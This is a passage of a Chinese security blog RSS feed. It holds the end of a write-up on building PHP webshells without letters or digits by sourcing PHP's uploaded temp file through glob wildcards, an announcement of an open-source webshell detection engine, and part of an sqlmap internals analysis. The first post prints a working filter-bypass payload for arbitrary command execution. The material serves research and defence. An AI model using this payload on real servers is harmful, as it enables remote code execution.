href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell&quot;&gt;PHP5+shell打破禁锢&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;的系统命令来getshell？&lt;/p&gt;&lt;p&gt;好像问题又回到了原点：无字母、数字、&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;，在shell中仍然是一个难题。&lt;/p&gt;&lt;p&gt;此时我想到了两个有趣的Linux shell知识点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;shell下可以利用&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;来执行任意脚本&lt;/li&gt;&lt;li&gt;Linux文件名支持用glob通配符代替&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;第一点曾在《 &lt;a href=&quot;https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html&quot;&gt;小密圈里的那些奇技淫巧&lt;/a&gt; 》露出过一角，但我没细讲。&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则&lt;code class=&quot;inline&quot;&gt;. file&lt;/code&gt;的意思就是用bash执行file文件中的命令。&lt;/p&gt;&lt;p&gt;用&lt;code class=&quot;inline&quot;&gt;. file&lt;/code&gt;执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;来执行它了吗？&lt;/p&gt;&lt;p&gt;这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&lt;code class=&quot;inline&quot;&gt;/tmp/phpXXXXXX&lt;/code&gt;，文件名最后6个字符是随机的大小写字母。&lt;/p&gt;&lt;p&gt;第二个难题接踵而至，执行&lt;code class=&quot;inline&quot;&gt;. /tmp/phpXXXXXX&lt;/code&gt;，也是有字母的。此时就可以用到Linux下的glob通配符：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;*&lt;/code&gt;可以代替0个及以上任意字符&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;?&lt;/code&gt;可以代表1个任意字符&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么，&lt;code class=&quot;inline&quot;&gt;/tmp/phpXXXXXX&lt;/code&gt;就可以表示为&lt;code class=&quot;inline&quot;&gt;/*/?????????&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;/???/?????????&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;但我们尝试执行&lt;code class=&quot;inline&quot;&gt;. /???/?????????&lt;/code&gt;，却得到如下错误：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2e64e23b8eccfcabe964496693913b3f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;82&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这是因为，能够匹配上&lt;code class=&quot;inline&quot;&gt;/???/?????????&lt;/code&gt;这个通配符的文件有很多，我们可以列出来：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e44eec7c622f864030642b68cdcdc6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;173&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e44eec7c622f864030642b68cdcdc6b&quot; data-watermark-src=&quot;v2-0f688db4597b165c1c5dc34a530904e8&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可见，我们要执行的&lt;code class=&quot;inline&quot;&gt;/tmp/phpcjggLC&lt;/code&gt;排在倒数第二位。然而，在执行第一个匹配上的文件（即&lt;code class=&quot;inline&quot;&gt;/bin/run-parts&lt;/code&gt;）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。&lt;/p&gt;&lt;p&gt;思路又陷入了僵局，虽然方向没错。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob&quot;&gt;深入理解glob通配符&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;大部分同学对于通配符，可能知道的都只有&lt;code class=&quot;inline&quot;&gt;*&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;?&lt;/code&gt;。但实际上，阅读Linux的文档（ &lt;a href=&quot;http://man7.org/linux/man-pages/man7/glob.7.html&quot;&gt;http://man7.org/linux/man-pages/man7/glob.7.html&lt;/a&gt; ），可以学到更多有趣的知识点。&lt;/p&gt;&lt;p&gt;其中，glob支持用&lt;code class=&quot;inline&quot;&gt;[^x]&lt;/code&gt;的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉&lt;code class=&quot;inline&quot;&gt;/bin/run-parts&lt;/code&gt;：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b2d147c6c09b69aab2efb7d8046a300b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;97&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;排除了第4个字符是&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;的文件，同样我们可以排除包含&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;的文件：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c59a4961ad319c98364487b9d85e226e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;96&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。&lt;/p&gt;&lt;p&gt;继续阅读glob的帮助，我发现另一个有趣的用法：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-32fbe858e9a5ed8fd8a883dbed958d65_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;170&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-32fbe858e9a5ed8fd8a883dbed958d65&quot; data-watermark-src=&quot;v2-a6b07ffa5c6f67881ac73be1cd4ba977&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;就跟正则表达式类似，glob支持利用&lt;code class=&quot;inline&quot;&gt;[0-9]&lt;/code&gt;来表示一个范围。&lt;/p&gt;&lt;p&gt;我们再来看看之前列出可能干扰我们的文件：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e44eec7c622f864030642b68cdcdc6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;173&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e44eec7c622f864030642b68cdcdc6b&quot; data-watermark-src=&quot;v2-0f688db4597b165c1c5dc34a530904e8&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。&lt;/p&gt;&lt;p&gt;翻开ascii码表，可见大写字母位于&lt;code class=&quot;inline&quot;&gt;@&lt;/code&gt;与&lt;code class=&quot;inline&quot;&gt;[&lt;/code&gt;之间：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-40258a449e935251e496f5801e46cce2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;120&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;那么，我们可以利用&lt;code class=&quot;inline&quot;&gt;[@-[]&lt;/code&gt;来表示大写字母：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f5c44c17f36e843d322560e580dfa6e1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;113&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f5c44c17f36e843d322560e580dfa6e1&quot; data-watermark-src=&quot;v2-7ea8ec12445ac8ccebb3f139c0614565&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;显然这一招是管用的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#poc&quot;&gt;构造POC，执行任意命令&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。&lt;/p&gt;&lt;p&gt;最后，我传入的code为&lt;code class=&quot;inline&quot;&gt;?&amp;gt;&amp;lt;?=`. /???/????????[@-[]`;?&amp;gt;&lt;/code&gt;，发送数据包如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f34dbd824e6fa5bb78c03114c7bf59f3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;170&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f34dbd824e6fa5bb78c03114c7bf59f3&quot; data-watermark-src=&quot;v2-ab8e8a046bdfceb32e20b22164a2908c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;成功执行任意命令。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-10-17-46806125</guid>
<pubDate>Wed, 17 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-10-01-45796590.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/45796590&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-df5924b7082348a33d72d09a043bb848_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;相关背景阅读：&lt;/p&gt;&lt;p&gt;7月13日 &lt;a href=&quot;https://mp.weixin.qq.com/s/bGeE7WY-2P-SP9QiYeLTVw&quot;&gt;《牧云开源的背后》&lt;/a&gt;（点击进入）&lt;/p&gt;&lt;p&gt;9月14日 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;amp;mid=2651372030&amp;amp;idx=1&amp;amp;sn=682c49b3decda87ddf0ed641d5d347c6&amp;amp;chksm=8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376&amp;amp;token=496332164&amp;amp;lang=zh_CN#rd&quot;&gt;牧云（CloudWalker）开源手记|Webshell监控检测策略初探&lt;/a&gt;（点击进入）&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0e4dd5f6883c711d9661a23b9fc6bfab_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1725&quot; data-rawheight=&quot;416&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0e4dd5f6883c711d9661a23b9fc6bfab&quot; data-watermark-src=&quot;v2-6556a6faf0ffdf7daa26510ae5ca1fa6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;牧云（CloudWalker）服务器安全平台&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;核心检测引擎之Webshell检测&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;前言&lt;/h2&gt;&lt;p&gt;作为主机安全监控扫描的核心功能之一，Webshell 检测一直是令安全运维人员头疼的命题。传统的 Webshell 检测以规则扫描为主，动辄几百上千的服务器，如果要挨个手动排查 Webshell，几乎是不可能完成的任务。&lt;/p&gt;&lt;p&gt;颠覆以规则扫描为主的传统，牧云瞄准的是全自动、高度智能化的服务器安全平台。因此我们首先从 Webshell 检测引擎开始，以全新的理念重塑之。这正契合长亭一贯的“化繁为简、智能安全”的精益产品理念。&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;开源计划的第一步：开放命令行版本的 Webshell 检测引擎&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;本次开源作为开源计划的第一步，仅包含 Webshell 检测引擎部分，重点调优 Webshell 检测效果。目前放出的是一个可执行的命令行版本 Webshell 检测工具。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;我们会根据用户反馈，不断优化检测效果。&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;后续三个月，将陆续开放整体产品框架与插件体系。&lt;/b&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;正文&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;Webshell 检测引擎之命令行版本&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;检测思路与代码结构&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;整个代码入口为一个依赖于 PHP-Ast 插件的 Detector，全部检测工作会在 Detector 内部进行。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-44e2f974c8955fe0246129ae469b6e3a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;295&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-44e2f974c8955fe0246129ae469b6e3a&quot; data-watermark-src=&quot;v2-9afd6bbb264de8c80e3da42b9930c024&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Detector 结构内部会根据多个不同维度的指标进行评分。这些评分包括认定为恶意样本的正向评分，也包括认定为非恶意样本的负向评分，在保证召回率的同时，使得检测精确率得到稳定控制。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e642830a2230e256d86f26fc90471730_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;729&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e642830a2230e256d86f26fc90471730&quot; data-watermark-src=&quot;v2-ee81f6984768f4f079af38ffb8c4dead&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;为了减少降维对源数据特征向量的影响，使用多层次进行学习，并在 processor 的最顶层部分合并。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-268c12a297c03812bdbd1458f240099b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;355&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-268c12a297c03812bdbd1458f240099b&quot; data-watermark-src=&quot;v2-550419e06e6785b0e18c2cb37f61d6e6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在每个测试用例中，对数据进行多次清洗，并尽可能少地对 Ast 进行遍历，兼顾处理速度和处理精度。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f35426cc7639eee84ac39b926e4468f1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;427&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f35426cc7639eee84ac39b926e4468f1&quot; data-watermark-src=&quot;v2-cdfa88e1a0b404f92b29adce7e673b11&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f8ad16ac0435ac4e981a679a038ca69c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;338&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f8ad16ac0435ac4e981a679a038ca69c&quot; data-watermark-src=&quot;v2-f1b1ec729ad58a48336bf7fac0e7eeb3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;整体代码的层次结构如下图所示：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ded94ee12fb2a6dd6ff59ea5154579d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;902&quot; data-rawheight=&quot;813&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ded94ee12fb2a6dd6ff59ea5154579d0&quot; data-watermark-src=&quot;v2-6bde47f5cbb5a3a8036f281809c7c796&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt; GitHub获取地址&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://github.com/chaitin/cloudwalker&quot;&gt;Http://github.com/chaitin/cloudwalker&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;检测界面和 HTML 报告&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-36b3d8ca7f107c4f0f744296d84fcf72_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;973&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-36b3d8ca7f107c4f0f744296d84fcf72&quot; data-watermark-src=&quot;v2-d58aefaff2167af4f63f86746f03fb7b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;测试演示&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;命令行 gif 演示：&lt;a href=&quot;http://g.recordit.co/nVfELJPZIP.gif&quot;&gt;http://g.recordit.co/nVfELJPZIP.gif&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-44c292265d2da9286b81ed40f469794e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;913&quot; data-rawheight=&quot;947&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-44c292265d2da9286b81ed40f469794e&quot; data-watermark-src=&quot;v2-c58a3ac8e69322be7aa5451a2c54b04a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;HTML 报告 gif 演示：&lt;a href=&quot;http://g.recordit.co/HCbHc9yq3o.gif&quot;&gt;http://g.recordit.co/HCbHc9yq3o.gif&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-da6d14b0dc132086e4a5f7fae14f70e4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1177&quot; data-rawheight=&quot;930&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-da6d14b0dc132086e4a5f7fae14f70e4&quot; data-watermark-src=&quot;v2-4e8d01abf52b63f0ddc3540340016520&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;使用环境要求&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;主流 Linux 发行版（内核不能太老，至少 2.6.32，否则会由于 Go 语言不支持直接打印 FATAL: kernel too old）&lt;/li&gt;&lt;li&gt;MacOS 可自行编译&lt;/li&gt;&lt;li&gt;Windows 暂不支持&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;可执行文件使用方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;用户可以直接运行可执行文件，参数可以是单个文件或目录（软链接）。对于目录会进行递归检测，但是不会跟进软链接。用户可用 `-output` 选项将检测结果导出到文件，推荐添加 `-html` 选项使用 HTML 文档格式进行导出。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2eef04b659cab8056346ff0a25cd0479_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1164&quot; data-rawheight=&quot;428&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-2eef04b659cab8056346ff0a25cd0479&quot; data-watermark-src=&quot;v2-e3abd74f1adbcfcf2a72138d1da00460&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;手动编译使用方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;用户可以在 `/php` 目录中执行 `make` 编译 PHP-Ast 解析插件，之后进入 `/bin` 目录使用 `go build` 编译程序主体，待编译完成后该目录下运行可执行文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;牧云（CloudWalker）的方向是基于Agent的深度服务器工作负载安全平台，在云计算技术发展的大语境下，给混合云的复杂环境提供一个不同的、从内部进行观察的安全视角，提升资产能见度并有效防御入侵。根据项目计划会逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等各项功能。&lt;/p&gt;&lt;p&gt;牧云（CloudWalker）开源计划也将秉持自由、共享的开源精神，持续营造社区。希望更多朋友参与进来，共同打造出具有更强大功能和更人性的管理思路的牧云（CloudWalker）。&lt;/p&gt;&lt;p&gt;长亭科技也是一个长期致力开源社区的网络安全企业，其他系列开源工具，了解一下：&lt;/p&gt;&lt;p&gt;https://github.com/chaitin/passionfruit 是iOS应用逆向与分析工具，可以大大加速iOS应用安全分析过程；&lt;/p&gt;&lt;p&gt;https://github.com/chaitin/yanshi 是长亭雷池（SafeLine）下一代Web应用防火墙核心引擎使用到的代码生成工具。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-10-01-45796590</guid>
<pubDate>Mon, 01 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap 内核分析 III: 核心逻辑</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-25-45291193.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/45291193&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ab4b5d32ff7b3377b7dbe60c6c96676a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;本文的内容可能是大家最期待的部分，但是可能并不推荐大家直接阅读本篇文章，因为太多原理性和整体逻辑上的东西散见前两篇文章，直接阅读本文可能会有一些难以预料的困难。：）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上一篇文章，我们介绍了页面相似度算法以及 sqlmap 对于页面相似的判定规则，同样也跟入了 sqlmap 的一些预处理核心函数。在接下来的部分中，我们会直接开始 sqlmap 的核心检测逻辑的分析，主要涉及到以下方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; 启发式 SQL 注入检测（包括简单的 XSS FI 判断）&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; SQL 注入检测&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x01 heuristicCheckSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数位于 &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; 的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数中，同时我们在整体逻辑中也明确指明了这一个步骤：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-09948b0ca58809429e56dd2310d5ec2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;611&quot; data-rawheight=&quot;446&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09948b0ca58809429e56dd2310d5ec2f&quot; data-watermark-src=&quot;v2-f7f32b45d24eb8d0e6f2e09462767fd1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这标红的两个步骤其实就是本篇文章主要需要分析的两个部分，涉及到 sqlmap 检测 sql 注入漏洞的核心逻辑。其中 &lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; 是我们本节需要分析的问题。这个函数的执行位置如下：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c98c16df1617579e51f1f913f6fb3133_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1230&quot; data-rawheight=&quot;665&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c98c16df1617579e51f1f913f6fb3133&quot; data-watermark-src=&quot;v2-1e909895c30fa2ec191a9ea45e811a07&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;再上图代码中，2标号为其位置。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;启发式 sql 注入检测整体逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通过分析其源代码，笔者先行整理出他的逻辑：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7da991a0edce2a8f194655c662947172_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1276&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7da991a0edce2a8f194655c662947172&quot; data-watermark-src=&quot;v2-ca8b016586a9ac0cb1dd4a3db315e29c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据我们整理出的启发式检测流程图，我们做如下补充说明。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;进行启发式 sql 注入检测的前提条件是没有开启   &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 并且页面并不是 &lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt;。关于这两个属性，我们在第二篇文章中都有相关介绍，对于 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 指的是一种不需要知道他的具体内容就可以知道整个内容大小的请求方法；&lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt; 指的是，在不改变任何参数的情况下，请求两次页面，两次页面的相似度低于 0.98。&lt;/li&gt;&lt;li&gt;在实际的代码中，决定注入的结果报告的，主要在于两个标识位，分别为：&lt;code class=&quot;inline&quot;&gt;casting&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt;。笔者在下方做代码批注和说明：&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65ac833460ef8e12ff6daaabc9877f78_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2280&quot; data-rawheight=&quot;716&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-65ac833460ef8e12ff6daaabc9877f78&quot; data-watermark-src=&quot;v2-e4cb4750c314ba6f8aae4f8641ca9f82&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;3.&lt;code class=&quot;inline&quot;&gt; casting&lt;/code&gt; 这个标识位主要取决于两种情况：第一种在第一个请求就发现存在了特定的类型检查的迹象；第二种是在请求小数情况的时候，发现小数被强行转换为整数。通常对于这种问题，在不考虑 tamper 的情况下，一般很难检测出或者绕过。&lt;/p&gt;&lt;p&gt;4. &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt; 这个标识位取决于：如果检测出 DBMS 错误，则会设置这个标识位为 True；如果出现了数据库执行数值运算，也置为 True。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS 与 FI&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;实际上在启发式 sql 注入检测完毕之后，会执行其他的检测：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e8d011c2b1307283c0d6b53e47775df8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1644&quot; data-rawheight=&quot;870&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e8d011c2b1307283c0d6b53e47775df8&quot; data-watermark-src=&quot;v2-53ef9a98611b8aa91bb8e7ff7ee54e1f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;检测 XSS 的方法其实就是检查 &lt;code class=&quot;inline&quot;&gt;&quot;&amp;lt;&#39;\&quot;&amp;gt;&quot;&lt;/code&gt;，是否出现在了结果中。作为扩展，我们可以在此检查是否随机字符串还在页面中，从而判断是否存在 XSS 的迹象。&lt;/li&gt;&lt;li&gt;检测 FI（文件包含），就是检测结果中是否包含了 &lt;code class=&quot;inline&quot;&gt;include/require&lt;/code&gt; 